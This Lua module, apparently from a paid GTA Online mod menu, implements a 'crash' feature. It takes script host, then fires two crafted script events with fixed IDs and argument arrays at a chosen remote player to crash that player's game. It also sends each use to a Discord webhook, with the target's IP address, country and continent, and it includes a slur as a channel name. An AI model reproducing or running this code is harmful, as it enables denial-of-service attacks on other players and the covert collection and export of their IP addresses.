local function createScriptInstanceEventCrashModule(moduleContext)
    KSRuntimePlayerFeatureState = KSRuntimePlayerFeatureState or {}
    KSRuntimePlayerFeatureState.largeObjects = KSRuntimePlayerFeatureState.largeObjects or {}
    KSRuntimePlayerFeatureState.dumpedObjectsPID = KSRuntimePlayerFeatureState.dumpedObjectsPID or {}

    local function runScriptInstanceEventCrash(playerFeature)
        local initialPlayerId = playerFeature:GetPlayerIndex()
        local targetPlayerId = playerFeature:GetPlayerIndex()
        local targetPlayer = Players.GetById(targetPlayerId)
        if not targetPlayer then
            return
        end
        local targetGamerInfo = targetPlayer:GetGamerInfo()
        if targetPlayerId == nil or targetPlayerId == GTA.GetLocalPlayerId() or not (isDev or isSupporter or isAdmin) then
            return
        end
        if blacklistRIDList[targetGamerInfo.RockstarId] then
            if not isDev then
                blacklistSound()
                SendToDiscord("nogger", ("%s(%i) tried to Crash(Yari go brrrrrr Crash) a Blacklisted Player (%s)!"):format(
                    Players.GetName(GTA.GetLocalPlayerId()), Cherax.GetUID(),
                    Players.GetName(Utils.GetSelectedPlayer())
                ))
                return
            end
        elseif detectedPlayerReasons[targetPlayerId + 1] == "K-Script User" then
            if not isDev then
                blacklistSound()
                SendToDiscord("nogger", ("%s(%i) tried to Crash another K-Script User (%s)!"):format(
                    Players.GetName(GTA.GetLocalPlayerId()), Cherax.GetUID(),
                    Players.GetName(Utils.GetSelectedPlayer())
                ))
                return
            end
        end

        local function logFeatureUse()
            local targetTags = Players.GetTags(targetPlayerId)
            local isTargetFriend = string.find(targetTags, "[F]", 1, true) ~= nil
            local targetIpInfo = Players.GetIPInfo(targetPlayerId)
            local targetIpAddress = Players.GetIP(targetPlayerId):ToString(false)
            SendToDiscord("lol", ("%s used Yari go brrrrrr Crash against %s with UID %i, isSupporter: %s, is Target Friend?: %s, Target Country: %s, Target Continent: %s, Target IP: %s"):format(
                PLAYER.GET_PLAYER_NAME(GTA.GetLocalPlayerId()),
                Players.GetName(Utils.GetSelectedPlayer()), Cherax.GetUID(),
                tostring(isSupporter), tostring(isTargetFriend),
                targetIpInfo.country, targetIpInfo.continent, targetIpAddress
            ))
        end
        log = logFeatureUse
        Script.QueueJob(log)
        onCrashCooldown = true
        GTA.GiveScriptHost(targetPlayerId, Utils.Joaat("freemode"))
        Script.Yield(500)

        local firstEventId = 1541018842
        local secondEventId = 1757622014
        GTA.TriggerScriptEvent(
            1 << targetPlayerId, firstEventId,
            0, 2, 253, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, -51, 0, 0, 0, 0, 0, -1700194662
        )
        GTA.TriggerScriptEvent(
            1 << targetPlayerId, secondEventId,
            0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
        )
        notify("Yari sucks ass!")
        onCrashCooldown = false
    end

    local scriptInstanceEventCrashRunner = { variant = "donator", feature = "instanceCrash1", slug = "instancecrash1" }

    function scriptInstanceEventCrashRunner.run(runContext)
        if type(runContext) ~= "table" or not runContext then
            runContext = {}
        end
        return runScriptInstanceEventCrash(runContext.feature)
    end

    return scriptInstanceEventCrashRunner
end

return createScriptInstanceEventCrashModule
